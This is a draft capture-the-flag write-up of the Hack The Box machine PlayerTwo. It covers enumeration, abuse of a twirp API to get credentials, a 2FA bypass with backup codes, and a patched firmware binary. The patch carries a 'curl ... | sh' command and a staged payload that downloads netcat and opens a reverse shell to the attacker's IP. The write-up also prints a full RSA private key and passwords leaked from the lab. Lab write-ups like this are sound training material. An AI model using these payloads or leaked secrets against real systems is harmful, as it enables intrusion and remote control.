# HTB - PlayerTwo

## Overview

![](../.gitbook/assets/playertwo-infocard.png)

An Insane difficulty Linux machine that tested my web skills a lot...&lt;more&gt;

## Useful Skills and Tools

&lt;add useful things&gt;

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.170`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oN <name>` saves the output with filenames of `<name>`.  

```text
zweilos@kalimaa:~/htb/playertwo$ nmap -p- -sC -sV -O -oA playertwo.full 10.10.10.170

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 13:01 EDT
Nmap scan report for 10.10.10.170
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0e:7b:11:2c:5e:61:04:6b:e8:1c:bb:47:b8:4d:fe:5a (RSA)
|   256 18:a0:87:56:64:06:17:56:4d:6a:8c:79:4b:61:56:90 (ECDSA)
|_  256 b6:4b:fc:e9:62:08:5a:60:e0:43:69:af:29:b3:27:14 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8545/tcp open  http    (PHP 7.2.24-0ubuntu0.18.04.1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:36 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/nice%20ports%2C/Tri%6Eity.txt%2ebak"","meta":{"twirp_invalid_route":"GET /nice%20ports%2C/Tri%6Eity.txt%2ebak"}}
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:21 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:22 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"OPTIONS /"}}
|   OfficeScan: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:38 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|_    {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8545-TCP:V=7.80%I=7%D=5/31%Time=5ED3E880%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,FC,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Sun,\x2031\x2
SF:0May\x202020\x2017:29:21\x20GMT\r\nConnection:\x20close\r\nX-Powered-By
SF::\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20application/j
SF:son\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20for\x20pa
SF:th\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/\"}}"
SF:)%r(HTTPOptions,100,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Sun,\
SF:x2031\x20May\x202020\x2017:29:22\x20GMT\r\nConnection:\x20close\r\nX-Po
SF:wered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20appli
SF:cation/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20f
SF:or\x20path\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"OPTIONS
SF:\x20\\/\"}}")%r(FourOhFourRequest,144,"HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nDate:\x20Sun,\x2031\x20May\x202020\x2017:29:36\x20GMT\r\nConnection
SF::\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nCont
SF:ent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"
SF:no\x20handler\x20for\x20path\x20\\\"\\/nice%20ports%2C\\/Tri%6Eity\.txt
SF:%2ebak\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/nice%20ports
SF:%2C\\/Tri%6Eity\.txt%2ebak\"}}")%r(OfficeScan,FC,"HTTP/1\.1\x20404\x20N
SF:ot\x20Found\r\nDate:\x20Sun,\x2031\x20May\x202020\x2017:29:38\x20GMT\r\
SF:nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04
SF:\.1\r\nContent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\"
SF:,\"msg\":\"no\x20handler\x20for\x20path\x20\\\"\\/\\\"\",\"meta\":{\"tw
SF:irp_invalid_route\":\"GET\x20\\/\"}}");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/31%OT=22%CT=1%CU=37408%PV=Y%DS=2%DC=I%G=Y%TM=5ED3E8B
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1482.37 seconds
```

Despite all of that output, there were only three ports open; SSH and two that looked to return HTTP data.  The output from `TCP 8545` didn't look like HTML, rather it was reporting a Content-Type of `application/json`.  The message `"twirp_invalid_route"` looks like something to be investigated since nmap couldn't identify it.

### Enumerating `Port 80 - HTTP`

Before jumping off into any potential rabbit holes with the strange output from port 8545, it was best to fire up a browser and first try to connect to the open port 80 at [http://10.10.10.170](http://10.10.10.170).  

![](../.gitbook/assets/1-error.png)

Oops, well that didn't seem to work.  Refreshing the page just brings up this message again.  Looking closer at the output on the page...it says `Firefox can't load this page for some reason.` This is somewhat interesting, considering I was not using Firefox at the time, so I looked at the page source and discovered that it was actually a PNG image rather than text being displayed.  This wasn't an error message so much as the actual page content.  

Looking at the text in the image, I noticed that it says "Please contact `MrR3boot@player2.htb`."  This looks like a potential username and hostname.  Perhaps redirecting my traffic to `http://player2.htb` would get me different output.  

#### Adding a hostname to the hosts file

In order to get the intended page for a server, sometimes you need to direct your traffic to the site's FQDN rather than it's IP address.  In order to do this you will need to tell your computer where to find that domain by adding the following line to `/etc/hosts`

```text
10.10.10.170    player2.htb 
```

### Enumerating the real website

After adding the domain to the hosts file, navigating to [http://player2.htb](http://player2.htb) lead me to the real company website.  By the looks of it, this company has suffered some sort of network breach before and has upped their security standards since.

![](../.gitbook/assets/2-first-site.png)

After reading through the content on the page, I found a link to a subdomain at [http://product.player2.htb/](http://product.player2.htb/). Once again I added the new domain to my hosts file, and after navigating to this new site I found a login page.

```text
10.10.10.170    player2.htb
10.10.10.170    product.player2.htb
```

![](../.gitbook/assets/3-login-page.png)

I tried some basic credentials like `admin:admin` but only got an alert box back saying `Nope.` I figured that I must have to find the credentials omewhere else, and decided to check out that other HTTP port I had seen earlier.

### Enumerating `Port 8545 - twirp`

player2.htb:8545 \[port from nmap scan\] JSON { "code": "bad\_route", "msg": "no handler for path \"/\"", "meta": { "twirp\_invalid\_route": "GET /" } }

[https://twitchtv.github.io/twirp/docs/curl.html](https://twitchtv.github.io/twirp/docs/curl.html) [https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md)

using gobuster - found proto directory [http://player2.htb/proto/](http://player2.htb/proto/)

running `cewl -d 3 -o -a -e -w player2.cewl http://player2.htb` to make wordlist didn't get me any hits with wfuzz, but a standard wordlist did... `-d` depth, `-o` follow links to outside sites, `-e` XXXXX, `-w <file>` writes to `<file>`.

```text
zweilos@kalimaa:~/htb/playertwo$ wfuzz -X GET -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --sc 200  -c http://player2.htb/proto/FUZZ.proto

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://player2.htb/proto/FUZZ.proto
Total requests: 87665

===================================================================
ID           Response   Lines    Word     Chars       Payload                               
===================================================================


000034176:   200        18 L     46 W     266 Ch      "generated"
```

Downloading this file gets us:

```text
syntax = "proto3";

package twirp.player2.auth;
option go_package = "auth";

service Auth {
  rpc GenCreds(Number) returns (Creds);
}

message Number {
  int32 count = 1; // must be > 0
}

message Creds {
  int32 count = 1;
  string name = 2; 
  string pass = 3; 
}
```

[https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md) example:

```text
curl --request "POST" \
     --location "http://localhost:8080/twirp/twirp.example.haberdasher.Haberdasher/MakeHat" \
     --header "Content-Type:application/json" \
     --data '{"inches": 10}' \
     --verbose
```

[https://twitchtv.github.io/twirp/docs/spec\_v5.html](https://twitchtv.github.io/twirp/docs/spec_v5.html) to interact: POST to /twirp/twirp.player2.auth.Auth/GenCreds; make sure to send "data" even if empty...make sure to send `Content-Type:application/json` header as well!

```text
POST /twirp/twirp.player2.auth.Auth/GenCreds HTTP/1.1
Host: player2.htb:8545
Content-Type:application/json
Content-Length: 6

{}
```

```text
HTTP/1.1 200 OK
Host: player2.htb:8545
Date: Wed, 24 Jun 2020 18:30:22 GMT
Connection: close
X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
Content-Type: application/json

{"name":"snowscan","pass":"ze+EKe-SGF^5uZQX"}
```

names:

* mprox
* jkr
* snowscan
* 0xdf

passwords:

* ze+EKe-SGF^5uZQX
* tR@dQnwnZEk95\*6\#
* XHq7_WJTA?QD_?E2
* Lp-+Q8umLW5\*7qkc

only 4 usernames and 4 password possibilities

![Nope.](../.gitbook/assets/4-nope.png)

Nope. Many times...and then...[http://product.player2.htb/totp](http://product.player2.htb/totp) 

![](../.gitbook/assets/5-2fa.png)

2FA! need OTP [http://product.player2.htb/api/totp](http://product.player2.htb/api/totp)

> 2FA You can either use the OTP that we sent to your mobile or the `backup codes` that you have with you.

Emphasis mine. sending blank data like before gives us "invalid session", so probably need to send PHPSESSID.  Reply has flag `Cache-Control: no-store, no-cache, must-revalidate` ~~seems to give a different session ID each time. Looks like need to request the creds and send directly to the OTP API...then possibly also send OTP...all in one back to back session.~~

Keep getting invalid\_session error...-&gt;  **Need to send session ID in COOKIE!!!** 

2FA request

```text
POST /api/totp HTTP/1.1
Host: product.player2.htb
Content-Type:application/json
Content-Length: 31
Cookie: PHPSESSID=7987tggfl6k22pq872k2vhqcej

{
  "action":"backup_codes"}
```

2FA response

```text
HTTP/1.1 200 OK
Date: Wed, 24 Jun 2020 23:56:46 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 43
Content-Type: application/json

{"user":"snowscan","code":"84573484857384"}
```

## Initial Foothold

[http://product.player2.htb/protobs/](http://product.player2.htb/protobs/)



![](../.gitbook/assets/8-protobs-after2fa.png)

 can upload file http://product.player2.htb/protobs

![](../.gitbook/assets/11-protobs-uploader.png)

 [http://product.player2.htb/protobs/verify](http://product.player2.htb/protobs/verify) blank white page after uploading php reverse shell...

![](../.gitbook/assets/12-protobs-pdf_link.jpg)

looking around more found pdf at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf) has links to firmware download and verify page \(link hard to see above\)

protobs.bin 

```text
zweilos@kalimaa:~/htb/playertwo$ file Protobs.bin 
Protobs.bin: data
```

opened in ghex...niticed ELF header starts well into the file...whats at the beginning? cut that part out and opened in ghidra saw a string in the ELF that looks like a shell command. If I can replace this with my own command could possibly get code execution on the remote server. searching how to replace a section of code in the elf [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file) leads to: [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd)

cheating using GHex! insert this into bin file &gt; left file as-is, just replaced current command with `curl 10.10.15.20:8090/a | sh`

my staged payload:

```text
#!/bin/sh
curl 10.10.15.20:8090/nc -o /dev/shm/nc
chmod +x /dev/shm/nc
/dev/shm/nc 10.10.15.20 12345 -e /bin/sh
```

between days my ip changed so I had two re-write my payloads...

## Road to User

```text
zweilos@kalimaa:~/htb/playertwo$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.10.15.20] from (UNKNOWN) [10.10.10.170] 37418
whoami && hostname
www-data
player2
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")';
www-data@player2:/var/www/product/protobs$ ^Z             
[1]+  Stopped                 nc -lvnp 12345
zweilos@kalimaa:~/htb/playertwo$ stty raw -echo;
zweilos@kalimaa:~/htb/playertwo$ fg

www-data@player2:/var/www/product/protobs$ ls -la
total 48
drwxr-xr-x 5 root     root     4096 Dec 16  2019 .
drwxr-xr-x 6 www-data www-data 4096 Dec  1  2019 ..
-rwxr-xr-x 1 www-data www-data 1176 Sep  3  2019 gen_firm_keys.py
-rw-r--r-- 1 www-data www-data 3410 Nov 10  2019 index.php
dr-x------ 2 www-data www-data 4096 Sep  3  2019 keys
drwxr-xr-x 4 www-data www-data 4096 Sep  5  2019 pihsm
-rw-r--r-- 1 root     root     4711 Dec  1  2019 protobs_firmware_v1.0.tar
-rwxr-xr-x 1 www-data www-data  804 Sep  4  2019 sign_firm.py
drwxrwxrwx 2 www-data www-data 4096 Jun 25 02:54 uploads
-rw-r--r-- 1 www-data www-data 1775 Dec 10  2019 verify.php
-rwxr-xr-x 1 www-data www-data  837 Dec  1  2019 verify_signature.py
```

```text
www-data@player2:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jul 27  2019 .
drwxr-xr-x 23 root     root     4096 Sep  5  2019 ..
drwxr-xr-x  6 observer observer 4096 Nov 16  2019 observer
```

```text
www-data@player2:/home$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
observer:x:1000:1000:observer:/home/observer:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
mosquitto:x:112:115::/var/lib/mosquitto:/usr/sbin/nologin
egre55:x:1001:1001::/home/egre55:/bin/sh
```

hmm egre55 user home folder wasn't visible to me; root, egre55, and observer can log in

from ps aux

```text
/usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
  1177 ?        Ssl    0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unat
  1178 ?        Ss     0:00 /usr/sbin/apache2 -k start
  1225 ?        Sl     0:09 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/
  1527 ?        S      0:00 /usr/sbin/CRON -f
  1535 ?        Ss     0:00 /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/b
  1541 ?        S      0:00 sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0
```

unfortunately output is cut off...wait...dont be dumb... sent to file and not cut off lol

```text
mosquit+   1164  0.0  0.2  48024  5792 ?        S    Jun24   0:05 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
root       1177  0.0  1.0 185924 20136 ?        Ssl  Jun24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       1178  0.0  0.8 337936 17196 ?        Ss   Jun24   0:00 /usr/sbin/apache2 -k start
mysql      1225  0.0  9.7 1490216 189964 ?      Sl   Jun24   0:09 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root       1527  0.0  0.1  57496  3288 ?        S    Jun24   0:00 /usr/sbin/CRON -f
root       1535  0.0  0.0   4624   864 ?        Ss   Jun24   0:00 /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php"
root       1541  0.0  0.2  66548  4352 ?        S    Jun24   0:00 sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1543  0.0  0.0   4624   872 ?        S    Jun24   0:00 /bin/dash -p -c \/bin\/sh -c \/usr\/bin\/php\ -S\ 0\.0\.0\.0\:8545\ \/var\/www\/main\/server\.php
egre55     1544  0.0  0.0   4624   832 ?        S    Jun24   0:00 /bin/dash -p -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1545  0.0  1.1 275764 21384 ?        S    Jun24   0:00 /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
```

Netstat shows two additional ports listening on 127.0.0.1 port 1883 -&gt; MQQT port 3306 -&gt; MySQL

`/etc/mosquitto/mosquitto.conf`

```text
# Place your local configuration in /etc/mosquitto/conf.d/
# 
# A full description of the configuration file is at
# /usr/share/doc/mosquitto/examples/mosquitto.conf.example

pid_file /var/run/mosquitto.pid

persistence true
persistence_location /var/lib/mosquitto/

log_dest file /var/log/mosquitto/mosquitto.log
bind_address 127.0.0.1
include_dir /etc/mosquitto/conf.d
```

### Mosquitto \(MQTT\) Research

[https://mosquitto.org/](https://mosquitto.org/) [https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto](https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto) [https://github.com/Warflop/IOT-MQTT-Exploit](https://github.com/Warflop/IOT-MQTT-Exploit) [https://mosquitto.org/man/mosquitto\_pub-1.html](https://mosquitto.org/man/mosquitto_pub-1.html) [https://mosquitto.org/man/mqtt-7.html](https://mosquitto.org/man/mqtt-7.html)

[https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html\#\_Toc3901014](https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901014)

```text
4.7.2  Topics beginning with $

The Server MUST NOT match Topic Filters starting with a wildcard character (# or +) with Topic Names beginning with a $ character [MQTT-4.7.2-1]. The Server SHOULD prevent Clients from using such Topic Names to exchange messages with other Clients. Server implementations MAY use Topic Names that start with a leading $ character for other purposes.

Non-normative comment

·         $SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs

·         Applications cannot use a topic with a leading $ character for their own purposes

Non-normative comment

·         A subscription to “#” will not receive any messages published to a topic beginning with a $

·         A subscription to “+/monitor/Clients” will not receive any messages published to “$SYS/monitor/Clients”

·         A subscription to “$SYS/#” will receive messages published to topics beginning with “$SYS/”

·         A subscription to “$SYS/monitor/+” will receive messages published to “$SYS/monitor/Clients”

·         For a Client to receive messages from topics that begin with $SYS/ and from topics that don’t begin with a $, it has to subscribe to both “#” and “$SYS/#”
```

Should subscribe to both `$SYS/#` AND `#`

### Finding user creds

to subscribe to `$SYS/#` use `mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v`

```text
observer@player2:~$ mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v
$SYS/broker/version mosquitto version 1.4.15
$SYS/broker/timestamp Tue, 18 Jun 2019 11:42:22 -0300
...snipped...
$SYS/internal/firmware/signing Retrieving the key from aws instance
$SYS/internal/firmware/signing Key retrieved..
$SYS/broker/uptime 319 seconds
...snipped...
$SYS/internal/firmware/signing -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
R0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4
et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT
+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz
SM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE
+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd
62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN
wANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D
62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO
91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC
gw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/Y
QACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f
llga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos
JqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3
JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt
ioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP
QFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T
pp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4
hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRf
PYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI
NoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt
uaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6M
zxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK
/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz
iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==
-----END RSA PRIVATE KEY-----

$SYS/internal/firmware/signing Verifying signing..
$SYS/internal/firmware/signing Sent logs to apache server.
```

I have an SSH key! Lets try it with `egre55` and `observer` users we saw earlier...

```text
zweilos@kalimaa:~/htb/playertwo$ ssh -i observer_id_rsa observer@10.10.10.170
load pubkey "observer_id_rsa": invalid format
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 25 21:41:14 UTC 2020

  System load:  0.0                Processes:            167
  Usage of /:   26.1% of 19.56GB   Users logged in:      0
  Memory usage: 25%                IP address for ens33: 10.10.10.170
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

121 packages can be updated.
5 updates are security updates.


Last login: Sun Dec  1 15:33:19 2019 from 172.16.118.129
```

`load pubkey "observer_id_rsa": invalid format` &gt;? hmm seems to have worked.

### User.txt

`observer@player2:~$ cat user.txt b1aade7c541ab9a9cc82f34aaf61bcfa`

real flag in uppercase ^

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `observer`

121 packages out of date, 5 security updates.

> > See linpeas &lt;&lt; `/opt/Configuration_Utility/Protobs` SETUID bit set on this file

```text
observer@player2:~$ cd /opt/Configuration_Utility/
observer@player2:/opt/Configuration_Utility$ ls
ld-2.29.so  libc.so.6  Protobs
observer@player2:/opt/Configuration_Utility$ file Protobs 
Protobs: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/Con, for GNU/Linux 3.2.0, BuildID[sha1]=53892814b4e50f2f75dd5fa98b077741917688a2, stripped
```

Found the configuration utility for the `protobs` program, which has the `setuid` bit set. This looks like something that could possibly be used to do my privilege escalation. The two `.so` files look like clues as to how the file is built? Unfortunately I am quite weak on reverse engineering and binary exploitation so this may be beyond me for now. I will return to this one at a later date after I learn more.

### Root.txt

`Nope.`

Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) & [`b14ckh34rt`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for &lt;something interesting or useful about this machine.&gt;

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).

